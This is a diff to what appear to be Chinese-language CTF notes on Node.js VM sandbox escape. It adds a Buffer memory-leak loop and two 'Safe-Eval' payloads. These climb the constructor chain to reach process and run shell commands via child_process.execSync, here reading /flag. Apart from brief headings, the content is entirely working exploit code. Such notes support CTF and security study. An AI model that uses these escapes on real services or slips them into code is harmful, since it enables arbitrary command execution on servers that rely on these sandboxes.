@@ -37,7 +37,7 @@ https://3nd.xyz/2019/09/10/Summary/Javascript-Prototype-Attack/#0x07-%E5%8F%82%E
 
 ## VM虚拟机逃逸
 
-## Buffer
+### Buffer
 
 随机泄露内存
 ```js
@@ -51,6 +51,51 @@ for (var step = 0; step < 100000; step++) {
     if (buf.indexOf("target") !== -1)  break;
 }
 buf;
+```
+### Payload
+
+#### Safe-Eval
+
+```js
+clearImmediate.constructor("return process;")().mainModule.require("child_process").execSync("cat /flag").toString()
+```
+
+```js
+(function () {
+  const f = Buffer.prototype.write;
+  const ft = {
+    length: 10,
+    utf8Write(){
+
+    }
+  };
+  function r(i){
+    var x = 0;
+    try{
+      x = r(i);
+    }catch(e){}
+    if(typeof(x)!=='number')
+      return x;
+    if(x!==i)
+      return x+1;
+    try{
+      f.call(ft);
+    }catch(e){
+      return e;
+    }
+    return null;
+  }
+  var i=1;
+  while(1){
+    try{
+      i=r(i).constructor.constructor("return process")();
+      break;
+    }catch(x){
+      i++;
+    }
+  }
+  return i.mainModule.require("child_process").execSync("cat /flag").toString()
+}()).toString()
 ```
 
 ### 参考资料
